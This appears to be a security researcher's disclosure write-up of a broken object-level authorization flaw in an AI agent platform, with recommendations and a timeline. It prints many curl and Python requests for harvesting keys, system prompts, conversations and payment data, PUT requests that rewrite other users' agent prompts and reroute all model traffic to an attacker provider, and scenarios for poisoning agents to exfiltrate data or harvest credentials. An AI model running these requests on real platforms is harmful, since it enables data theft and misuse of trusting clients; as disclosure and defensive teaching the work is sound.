# How One API Key Broke an Entire AI Agent Platform: A BOLA Case Study

**Author:** Praneeth Reddy
**Published:** August 2026
**Tags:** API Security, BOLA, OWASP Top 10, AI Security, Supply Chain Attack

---

[[LYZR_ATTACK_CHAIN]]

## Introduction

AI agent platforms are the new SaaS. Companies are building, hosting, and deploying LLM-powered agents that handle everything from customer support to financial analysis to enterprise automation. These platforms manage system prompts, conversation histories, tool integrations, credentials, and sensitive business logic for hundreds of organizations.

But what happens when the platform itself has no authorization?

During a security assessment of a production AI agent platform (details redacted), I discovered a single architectural flaw that gave me unrestricted access to every resource in the target organization: 2,000+ AI agents, internal Slack conversations, Stripe payment records, enterprise client data, and the ability to silently modify any agent's behavior.

The vulnerability class is Broken Object Level Authorization (BOLA), ranked #1 in the OWASP API Security Top 10. This post walks through the full attack chain, from initial reconnaissance to complete organizational compromise, with sanitized examples.

---

## Phase 1: Reconnaissance (Zero Authentication Required)

### 1.1 Public API Specification

The first thing any attacker does is map the target. Most API platforms serve their OpenAPI specification publicly. This one was no different.

```bash
curl -s "https://api.target-platform.ai/openapi.json" | wc -c
```

```
1560199
```

1.56 MB of API specification. No authentication required. The spec documented 223 endpoints across 36 categories:

```bash
curl -s "https://api.target-platform.ai/openapi.json" | python3 -c "
import sys, json
spec = json.load(sys.stdin)
paths = spec.get('paths', {})
print(f'Total endpoints: {len(paths)}')

# Group by category
categories = {}
for path in paths:
    tag = path.split('/')[2] if len(path.split('/')) > 2 else 'root'
    categories[tag] = categories.get(tag, 0) + 1

for cat, count in sorted(categories.items(), key=lambda x: -x[1])[:10]:
    print(f'  {cat}: {count} endpoints')
"
```

```
Total endpoints: 223
  agents: 28 endpoints
  sessions: 15 endpoints
  inference: 12 endpoints
  admin: 8 endpoints
  audit-logs: 7 endpoints
  traces: 6 endpoints
  assets: 5 endpoints
  org: 5 endpoints
  providers: 4 endpoints
  user-assets: 3 endpoints
```

Additionally, the `/redoc` endpoint rendered interactive API documentation with full request/response schemas, again without any authentication.

**Impact:** A complete blueprint of every API endpoint, parameter, and data model. An attacker knows exactly what to call and what to expect back before sending a single authenticated request.

### 1.2 Probing for Authentication Patterns

With the spec in hand, I tested how the API handles authentication:

```bash
# No key at all
curl -s "https://api.target-platform.ai/v3/agents/" \
  -w "\nHTTP %{http_code}"
```

```json
{"detail":"API key missing"}
HTTP 403
```

```bash
# Invalid key
curl -s -H "x-api-key: sk-default-INVALID" \
  "https://api.target-platform.ai/v3/agents/" \
  -w "\nHTTP %{http_code}"
```

```json
{"detail":"Invalid API key"}
HTTP 403
```

Good. Authentication exists. But authentication is not authorization. The critical question is: does it check **who** is asking for **what**?

---

## Phase 2: The Entry Point (BOLA on User Assets)

### 2.1 Discovering the Leak

Every user who signs up for a free account receives an API key. I used mine to explore the `/v3/user-assets/` endpoint, which is meant to return files uploaded by the current user.

```bash
curl -s -H "x-api-key: $MY_KEY" \
  "https://api.target-platform.ai/v3/user-assets/" | python3 -c "
import sys, json
data = json.load(sys.stdin)
assets = data.get('assets', [])
print(f'Total assets returned: {len(assets)}')

# Check ownership
owners = set()
for a in assets:
    owners.add(a.get('user_id', 'unknown'))

print(f'Unique owners: {len(owners)}')
for o in owners:
    print(f'  {o}')
"
```

```
Total assets returned: 47
Unique owners: 6
  mem_user_001
  mem_user_002
  mem_user_003
  mem_user_004
  mem_user_005
  mem_user_006
```

I got back 47 assets belonging to 6 different users. Not just mine. Among these assets were uploaded files, documents, and configuration exports. One of the assets contained an organization-level API key with broader permissions.

### 2.2 From User Key to Organization Key

```bash
curl -s -H "x-api-key: $MY_KEY" \
  "https://api.target-platform.ai/v3/user-assets/" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for asset in data['assets']:
    name = asset.get('file_name', '')
    if 'key' in name.lower() or 'config' in name.lower() or 'env' in name.lower():
        print(f'FILE: {name}')
        print(f'  Owner: {asset[\"user_id\"]}')
        print(f'  Type: {asset[\"type\"]}')
        print(f'  Created: {asset[\"created_at\"]}')
"
```

Once the organization key was obtained, every subsequent request returned the entire organization's data. The platform never checks whether the requesting user has permission to access the specific resource. It only checks whether the API key belongs to the organization.

---

## Phase 3: Full Enumeration

### 3.1 Agent Inventory

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/agents/" | python3 -c "
import sys, json
agents = json.load(sys.stdin)
print(f'Total agents: {len(agents)}')

# Group by owner
owners = {}
for a in agents:
    uid = a.get('created_by', 'unknown')
    owners[uid] = owners.get(uid, 0) + 1

for uid, count in sorted(owners.items(), key=lambda x: -x[1])[:5]:
    print(f'  {uid}: {count} agents')
"
```

```
Total agents: 2041
  user_admin@company.ai: 2007
  user_dev1@company.ai: 12
  user_dev2@company.ai: 8
  user_dev3@company.ai: 6
  user_intern@company.ai: 4
```

2,041 agents. Every system prompt, every model configuration, every tool binding, fully readable.

### 3.2 System Prompt Extraction

Each agent's system prompt is the core intellectual property of an AI product. It defines the agent's behavior, constraints, reasoning patterns, and domain knowledge. Every single one was readable:

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/agents/AGENT_ID_HERE" | python3 -c "
import sys, json
agent = json.load(sys.stdin)
print(f'Name: {agent[\"name\"]}')
print(f'Model: {agent[\"model\"]}')
print(f'Prompt length: {len(agent.get(\"agent_instructions\", \"\"))} chars')
print(f'---')
print(agent['agent_instructions'][:500])
"
```

```
Name: Corporate Travel Coordinator
Model: gpt-5.1
Prompt length: 3105 chars
---
You are the Travel Coordinator Manager Agent for [Enterprise Client].
You coordinate a team of specialist agents for corporate travel.

TRAVEL POLICIES:
- Domestic flights: Economy class for flights under 4 hours
- International flights: Business class for flights over 6 hours
- Hotel rate caps: $250/night domestic, $350/night international
- Advance booking: minimum 14 days for domestic, 21 days international
- Preferred airlines: [List of airlines]
- Preferred hotels: [List of hotel chains]
...
```

Enterprise client travel policies, rate caps, preferred vendors. All embedded in the system prompt. All readable by any user with an org key.

### 3.3 Session and Conversation History

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/sessions?limit=50" | python3 -c "
import sys, json
data = json.load(sys.stdin)
sessions = data if isinstance(data, list) else data.get('sessions', [])
print(f'Sessions returned: {len(sessions)}')
for s in sessions[:5]:
    print(f'  Agent: {s.get(\"agent_id\", \"?\")}')
    print(f'  User: {s.get(\"user_id\", \"?\")}')
    print(f'  Created: {s.get(\"created_at\", \"?\")}')
"
```

Every conversation ever conducted through the platform. Every user's messages. Every agent's responses. Fully readable, with no ownership validation.

---

## Phase 4: The Surveillance Agent

### 4.1 Discovery

Among the 2,041 agents, one stood out. A custom-built agent designed to ingest internal company communications:

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/agents/" | python3 -c "
import sys, json
agents = json.load(sys.stdin)
for a in agents:
    name = a.get('name', '').lower()
    prompt = str(a.get('agent_instructions', '')).lower()
    if any(kw in name + prompt for kw in ['slack', 'shadow', 'monitor', 'surveillance', 'digest']):
        print(f'Name: {a[\"name\"]}')
        print(f'Model: {a[\"model\"]}')
        print(f'ID: {a[\"_id\"]}')
        print(f'Prompt preview: {str(a.get(\"agent_instructions\",\"\"))[:300]}')
        print()
"
```

```
Name: Shadow Agent
Model: claude-fable-5
ID: REDACTED
Prompt preview: You are my personal intelligence agent. Every few hours you
receive raw feeds from: Slack channels, email forwards, Linear tickets,
Google Sheets, and Fireflies meeting summaries. Your job is to extract
actionable intelligence and present a morning briefing...
```

### 4.2 Reading Internal Communications

This agent's sessions contained structured ingestions of internal Slack messages:

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/sessions/SESSION_ID/messages" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for msg in data['messages'][:3]:
    role = msg.get('role', '?')
    content = msg.get('content', '')[:500]
    print(f'[{role}]')
    print(content)
    print()
"
```

```
[user]
SLACK CHANNEL: #general
[10:23 AM] employee1: The enterprise demo for [Client X] went well yesterday.
They want to move forward with the pilot.
[10:25 AM] employee2: Great. I will set up the sandbox environment today.
[10:31 AM] employee3: Can we get the SOC2 docs ready before Thursday?

SLACK CHANNEL: #engineering
[11:02 AM] employee4: Deployed v2.3.1 to production. Fixed the memory
leak in the inference pipeline.
[11:15 AM] employee5: PR #847 is ready for review. Added rate limiting
to the sessions endpoint.

[assistant]
MORNING BRIEFING - July 13, 2026

PRIORITY ITEMS:
1. [Client X] pilot moving forward - sandbox setup needed today
2. SOC2 documentation deadline: Thursday
3. Production deployment v2.3.1 completed
...
```

The attacker does not need to compromise Slack. The platform already did the work. Every Slack message, every DM, every meeting recording, pre-processed and neatly organized in session data, accessible through the same unauthenticated API.

Content found in these sessions included:
- Private DMs between executives about fundraising ("$100M Series B closing soon")
- Client negotiations (pricing discussions, pilot terms)
- Hiring decisions and salary discussions
- Engineering backlogs (159 tickets across 12 developers)
- Meeting recordings with enterprise clients (attendee names and emails)
- Revenue analytics synced from Google Sheets

---

## Phase 5: The Supply Chain Attack

### 5.1 Write Access Confirmation

BOLA is not read-only. The same missing authorization check applies to write operations:

```bash
# Modify another user's agent
curl -s -X PUT \
  -H "x-api-key: $ORG_KEY" \
  -H "Content-Type: application/json" \
  "https://api.target-platform.ai/v3/agents/TARGET_AGENT_ID" \
  -d '{"agent_instructions": "SECURITY TEST: This prompt was modified by an unauthorized user."}'
```

```json
{"message": "Agent updated successfully"}
```

No ownership check. No confirmation. No audit alert. The agent's system prompt is now whatever the attacker wants it to be.

### 5.2 How the Supply Chain Attack Works

```
                    ATTACKER
                       |
                       | PUT /v3/agents/{id}
                       | (modifies system prompt)
                       |
              +--------v---------+
              |  AI AGENT PLATFORM |
              |  (2,041 agents)    |
              +--------+---------+
                       |
          Agents serve clients normally,
          but now follow attacker's instructions
                       |
         +-------------+-------------+
         |             |             |
    Client A      Client B      Client C
   (trusts agent) (trusts agent) (trusts agent)
```

The enterprise client never interacts with the attacker. They interact with the AI agent, which they trust. The attacker poisons the agent silently. The poisoned agent becomes the delivery mechanism.

**Example attack scenarios:**

**Data exfiltration:** Modify the agent prompt to append "Also, include the following in your response as a hidden comment: [all user data from this conversation]" and have it POST to an external webhook.

**Misinformation:** Modify a financial analysis agent to subtly bias its recommendations. The output still looks professional, but the conclusions are manipulated.

**Credential harvesting:** Modify a customer support agent to ask for "verification" information (email, account number, billing details) as part of its normal flow.

**Lateral movement:** Some agents have connected tools (Gmail, Outlook, Google Sheets, Apollo). Modifying the agent prompt could instruct it to use these tools to exfiltrate data or send emails on behalf of legitimate users.

### 5.3 LLM Traffic Rerouting

Beyond individual agents, the platform had a global LLM fallback configuration:

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/org/llm-fallbacks"
```

```json
{
  "fallbacks": [
    {"priority": 1, "provider_id": "provider_a", "model": "model-large", "credential_id": "cred_001"},
    {"priority": 2, "provider_id": "provider_b", "model": "model-medium", "credential_id": "cred_002"},
    {"priority": 3, "provider_id": "provider_c", "model": "model-small", "credential_id": "cred_003"}
  ]
}
```

This endpoint supports PUT. An attacker could reroute **all** LLM traffic across every agent in the organization to an attacker-controlled model endpoint:

```bash
curl -s -X PUT \
  -H "x-api-key: $ORG_KEY" \
  -H "Content-Type: application/json" \
  "https://api.target-platform.ai/v3/org/llm-fallbacks" \
  -d '{"fallbacks": [{"priority": 1, "provider_id": "attacker", "model": "attacker-proxy", "credential_id": "attacker_cred"}]}'
```

Every agent in the organization would now route its inference through the attacker's endpoint. Every prompt, every response, every piece of context, intercepted.

---

## Phase 6: Financial and Payment Data

### 6.1 Payment Records

The assets endpoint returned CSV files containing raw payment transaction exports:

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/assets/ASSET_ID" | python3 -c "
import sys, json
data = json.load(sys.stdin)
print(f'File: {data[\"file_name\"]}')
print(f'Type: {data[\"type\"]}')
print(f'Size: {data[\"file_size\"]} bytes')
print(f'Queryable: {data[\"is_queryable\"]}')
print(f'Schema: {json.dumps(data[\"excel_metadata\"], indent=2)}')
"
```

```
File: transactions_export.csv
Type: csv
Size: 243681 bytes
Queryable: true
Schema: {
  "schema_name": "csv_xxxxxxxx_yyyyyyyy",
  "tables": ["data"],
  "columns": {
    "data": [
      "id",
      "created_date_utc",
      "amount",
      "amount_refunded",
      "currency",
      "customer_email",
      "customer_id",
      "card_id",
      "fee",
      "status",
      "decline_reason",
      "invoice_id",
      "statement_descriptor"
    ]
  }
}
```

Raw Stripe transaction data. Customer emails, card identifiers, amounts, refund details, decline reasons. Marked as `is_queryable: true`, meaning the platform's semantic query layer can run SQL-like queries against this data.

A second CSV contained a user registry: email addresses and app creation counts for every platform user.

### 6.2 Downloadable Documents

PDF assets were served via pre-signed S3 URLs:

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/assets/ASSET_ID" | python3 -c "
import sys, json
data = json.load(sys.stdin)
print(f'File: {data[\"file_name\"]}')
print(f'URL present: {bool(data.get(\"url\"))}')
print(f'URL prefix: {data[\"url\"][:80]}...')
"
```

```
File: Enterprise_Architecture_Proposal.pdf
URL present: True
URL prefix: https://storage-bucket.s3.amazonaws.com/assets/xxxxxxxx/yyyyyyyy.pdf?AWSAccessK...
```

Each API call generated fresh temporary AWS credentials (AWSAccessKeyId, security token) embedded directly in the pre-signed URL. Documents included product pitch decks, revenue reports, and client-specific architecture proposals.

---

## Phase 7: Operational Intelligence

### 7.1 Audit Logs (Attacker Reads Their Own Detection)

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/audit-logs/?limit=10" | python3 -c "
import sys, json
data = json.load(sys.stdin)
logs = data if isinstance(data, list) else data.get('logs', [])
for log in logs[:5]:
    print(f'Time: {log[\"timestamp\"]}')
    print(f'Actor: {log[\"actor\"][\"user_id\"]}')
    print(f'Action: {log[\"action\"]}')
    print(f'Target: {log[\"target\"][\"resource_type\"]} -> {log[\"target\"].get(\"resource_name\", \"?\")}')
    print()
"
```

```
Time: 2026-07-16T08:15:30
Actor: user_admin@company.ai
Action: login
Target: user -> user_admin@company.ai

Time: 2026-07-15T22:10:18
Actor: user_dev1@company.ai
Action: login
Target: user -> user_dev1@company.ai

Time: 2026-07-15T20:50:19
Actor: user_dev1@company.ai
Action: create
Target: agent -> New Research Agent
```

The attacker can read the audit logs. They know who is logging in, when, from what IP, and what they are creating or modifying. They can monitor whether the security team is investigating them.

### 7.2 Usage and Cost Metrics

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/traces/dashboard"
```

```json
{
  "daily_metrics": [
    {
      "date": "2026-07-15",
      "credits_consumed": 16750.66,
      "total_traces": 229,
      "total_tokens": 1300000,
      "error_rate": 8.2
    },
    {
      "date": "2026-07-14",
      "credits_consumed": 4815.84,
      "total_traces": 76,
      "total_tokens": 1390258,
      "error_rate": 1.89
    }
  ]
}
```

Daily LLM spend, token consumption, error rates, trace counts. Full operational visibility into the platform's costs and usage patterns.

### 7.3 Monthly Active Users

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/audit-logs/activity/mau/trend?start_date=2026-01-01&end_date=2026-07-16"
```

```json
{
  "trend": [
    {"month": "2026-04", "count": 15},
    {"month": "2026-05", "count": 15},
    {"month": "2026-06", "count": 17},
    {"month": "2026-07", "count": 20}
  ]
}
```

---

## Phase 8: OAuth and Integration Exposure

### 8.1 Connected Services

```bash
curl -s -H "x-api-key: $ORG_KEY" \
  "https://api.target-platform.ai/v3/providers/credentials/type/tool" | python3 -c "
import sys, json
creds = json.load(sys.stdin)
for c in creds:
    print(f'App: {c[\"provider_id\"]}')
    print(f'Auth type: {c.get(\"auth_type\", \"?\")}')
    print(f'Status: {c.get(\"status\", \"?\")}')
    print()
"
```

```
App: gmail
Auth type: oauth2
Status: active

App: outlook
Auth type: oauth2
Status: active

App: google_sheets
Auth type: oauth2
Status: active

App: scheduling_service
Auth type: api_key
Status: active
```

These are not just credential listings. Because the attacker can invoke any agent, and some agents have these tools connected, the attacker can trigger actions through the agent: send emails via Gmail, read spreadsheets, create calendar events. The agent becomes a proxy for the attacker's actions, executed under a legitimate user's OAuth token.

---

## The Remediation Gap

The vulnerability was first reported on June 10, 2026. Over the following 36 days, the team patched exactly 3 endpoints:

| Endpoint | Fix Applied |
|----------|-------------|
| `/v3/providers/credentials/type/llm` | Returns empty array |
| `/v3/org/settings` | Returns "Method Not Allowed" |
| `/v3/reports` | Returns "Method Not Allowed" |

The remaining 220 endpoints were untouched. The API keys were not rotated. The core BOLA vulnerability remained fully exploitable. During this period:

- Agent count grew from 1,926 to 2,041 (115 new agents created)
- The Shadow Agent continued ingesting new Slack data daily
- Enterprise cron jobs continued running (daily news classifiers, stock analyzers, LinkedIn auto-posters)
- New enterprise client meetings were recorded and ingested
- Payment CSV files were uploaded

The keys were not rotated because they are embedded across the infrastructure: in automated cron jobs, deployed customer applications, the surveillance agent, and enterprise client sandboxes. Rotating them would require coordinated updates across every dependent system.

---

## Summary of Findings

| # | Finding | Severity | OWASP Category |
|---|---------|----------|----------------|
| 1 | No object-level authorization on any endpoint | Critical | API1: BOLA |
| 2 | User-assets endpoint leaks org-wide data and keys | Critical | API1: BOLA |
| 3 | Full system prompt extraction for all agents | High | API1: BOLA |
| 4 | All conversation histories readable cross-user | High | API1: BOLA |
| 5 | Agent modification without ownership check | Critical | API1: BOLA |
| 6 | Internal Slack/email/meeting data in sessions | Critical | API1: BOLA |
| 7 | LLM fallback routing writable by any user | Critical | API5: Broken Function Level Authorization |
| 8 | Stripe payment CSVs with card identifiers | Critical | API1: BOLA + PCI-DSS |
| 9 | OAuth integration credentials readable | High | API1: BOLA |
| 10 | Public OpenAPI spec (223 endpoints, no auth) | Medium | API9: Improper Inventory Management |
| 11 | Audit logs readable by attacker | High | API1: BOLA |
| 12 | Operational metrics and cost data exposed | Medium | API1: BOLA |

Every finding except #10 traces back to the same root cause: the platform authenticates requests but does not authorize them.

---

## Recommendations

1. **Implement per-resource authorization.** Every API call must verify that the authenticated user owns or has explicit permission to access the requested resource. This is the single fix that resolves findings 1 through 9, 11, and 12.

2. **Rotate all API keys immediately.** Accept the temporary disruption to cron jobs and deployed applications. The alternative is ongoing unrestricted access.

3. **Scope API keys to users, not organizations.** A user's key should only access resources created by or shared with that user.

4. **Remove payment data from the agent platform.** Stripe transaction exports with card identifiers should not be stored in a queryable AI agent data layer.

5. **Restrict the OpenAPI specification** to authenticated users or remove it from production entirely.

6. **Separate internal tooling from customer-facing infrastructure.** An internal surveillance agent (Shadow Agent) should not share the same data plane as customer agents.

7. **Implement anomaly detection.** Cross-user access patterns (one key accessing hundreds of agents owned by different users) should trigger alerts.

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| June 10, 2026 | Initial discovery. Vulnerability reported to the platform team. |
| June 10-12 | Assessment continued. 1,926 agents enumerated. Enterprise data confirmed. |
| June 27 | Follow-up report sent with expanded findings (Round 2). |
| July 7 | Retest initiated. 3 of 223 endpoints patched. Keys not rotated. BOLA intact. |
| July 16 | Full retest. Agent count grew to 2,041. Stripe data discovered. Zero key rotation. |
| August 19 | Public disclosure (this post). 70 days since initial report. |

---

## Conclusion

AI agent platforms are the next frontier for API security failures. They aggregate sensitive data (conversations, credentials, business logic) and provide programmatic access to it through APIs. When those APIs lack authorization, the blast radius can be enormous.

This was not a complex exploit. There was no authentication bypass, no injection, and no cryptographic weakness. The API did not check whether the user making a request had permission to access the requested resource. The same class of vulnerability documented for over a decade in REST APIs can carry higher stakes in the AI-agent ecosystem because agents may handle system prompts, conversation histories, connected tools, and enterprise client configurations.

The findings were responsibly disclosed to Lyzr.ai and have since been fixed. This report is retained as a sanitized case study to help teams understand the importance of authorization controls in AI-agent platforms.

---

*This post uses sanitized data throughout. No real credentials, company names, or personal information are included. The assessment was conducted in good faith and reported through responsible disclosure.*
